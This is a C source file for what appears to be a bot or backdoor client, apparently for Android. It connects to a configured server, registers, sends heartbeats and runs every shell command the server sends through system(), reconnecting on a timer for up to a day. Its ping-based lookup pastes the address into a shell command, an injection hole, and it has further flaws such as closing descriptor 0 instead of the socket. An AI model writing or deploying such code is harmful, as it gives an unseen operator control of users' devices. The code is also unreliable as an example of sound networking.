#include "contain.h"
#include <unistd.h>
#include "config.h"
#include "socket_control.h"
#include "project_head.h"
#include "pthreadxsx.h"

extern int extid;

//==============================connect================================

void* ping_pthread(void * argument)
{
	char* shell =(char*)argument;
	system(shell);
}


int dnsbyping(char* ip)
{
	char *filename = "tmp.txt";
	char newip[30] = {0};
	char ping[40] = {0};
	sprintf(ping,"ping %s > %s",ip,filename);
	pthread_t pid = pthread_run(ping_pthread,ping);
	sleep(2);
	pthread_cancel(pid);
	pthread_join(pid,NULL);
	int filefd = open(filename,O_RDWR);
	if(filefd == -1)
	{
		return false;
	}
	char buf[100] = {0};
	char *pr = buf;
	int res = 0;
	while( 1 )
	{
		res = read(filefd,pr,1);
		if(res != 1)
			return false;
		if(*pr != ')')
			pr++;
		else
			break;
	}
	close(filefd);
	unlink(filename);
	*pr = 0;
	pr = strchr(buf,'(');
	if(pr == NULL)
		return false;
	pr++;
	strcpy(ip,pr);
	return true;
}


int rgist(int sock)
{
	U_MSG k;
	k.regist_m.type = T_REGST;
	k.regist_m.id = 0;
	int n = write(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
	n = read(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
	extid = k.regist_m.id;
	return k.regist_m.id;
}


int beatheart(int sock)
{
	U_MSG k;
	k.regist_m.type = T_HEART;
	k.regist_m.id = extid;
	int n = write(sock,&k,sizeof(U_MSG));
	if(n!=sizeof(U_MSG))
		return false;
}

int waiting(int sock)
{
	U_MSG k;
	while(1)
	{
		int n = recv(sock,&k,sizeof(U_MSG),0);

		if(n!=sizeof(U_MSG))
		{
			perror("read err");
			return false;
		}
		switch(k.type)
		{
			case T_SHELL:
				{
					char *shellbuf = (char*)malloc(k.shell_m.commandlen+1);
					memset(shellbuf,0,k.shell_m.commandlen+1);
					n = read(sock,shellbuf,k.shell_m.commandlen);
					if(n!=k.shell_m.commandlen)
					{
						perror("read err");
						free(shellbuf);
						return false;
					}
					printf("%s\n", shellbuf);
					system(shellbuf);
					free(shellbuf);
					break;
				}
			default:
				break;
		}
		k.type = T_ANSWR;
		k.answer_m.id = extid;
		k.answer_m.torf = 1;

		n = write(sock,&k,sizeof(U_MSG));
		if(n!=sizeof(U_MSG))
		{
			perror("write err");
			return false;
		}
	}	
}

void connect_host(int m, short event, void* arg)
{
	char ipaddr[30];
	char port[10];
	free(arg);
	readcfg("ctosport",port);
	readcfg("ip",ipaddr);
	static int sec = 2;
	int sock = false;

	static int times_beatheart = 0;
	static int times_regist = 0;

DNS_label:
	if(dnsbyping(ipaddr) == false )
	{
		printf("dns fail");
		goto sleep_label;
	}

socket_label:
	if(	(sock = begin(ipaddr,port)) == false )
	{	
		printf("scoket fail");
		goto sleep_label;	
	}

checkcfg_label:
	if(extid == 0)
		goto regist_label;
	else
		goto beatheart_label;

regist_label:
	if(rgist(sock) == false)
	{
		printf("rgist fail");
		if(times_regist < 5)
		{
			times_regist++;
			sleep(5);
			goto socket_label;
		}
		else
		{
			times_regist = 0;
			goto sleep_label;
		}
	}

beatheart_label:
	if(beatheart(sock) == false)
	{
		printf("heart fail");
		if(times_beatheart < 5)
		{
			times_beatheart++;
			sleep(5);
			goto socket_label;
		}
		else
		{
			times_beatheart = 0;
			goto regist_label;		
		}
	}

waiting_label:
	if(waiting(sock) == false)
	{
		printf("task fail");
		goto sleep_label;			
	}

sleep_label:
	if(sock != false)
	{
		close(false);
		sock = false;
	}
	sec = sec*sec;
	if(sec > 3600*24)
		sec = 3600*24;
	Timer(sec,connect_host,NULL);
	printf("%d\n", sec);
	return ;
}



int linkbash()
{
	int red = mkdir("/bin",777);
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	red = symlink("/system/bin/sh","/bin/sh");
	if(red == -1)
	{
		if(errno != EEXIST)
		{
			perror("err:");
			return false;
		}
		errno = 0;
	}
	return true;
}






